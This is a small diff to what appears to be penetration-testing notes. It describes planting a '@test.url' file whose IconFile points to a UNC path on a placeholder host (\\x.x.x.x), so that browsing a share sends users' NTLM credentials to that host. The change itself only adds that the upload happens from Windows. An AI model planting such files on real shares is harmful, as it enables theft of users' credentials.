@@ -17,6 +17,7 @@ IconFile=\\x.x.x.x\%USERNAME%.icon
 IconIndex=1
 ```
 
-- We can then save the file as `"@test.url"` and upload it to a share
+- We can then save the file as `"@test.url"` and upload it to a share (This should be done in the windows system)
+
 
 
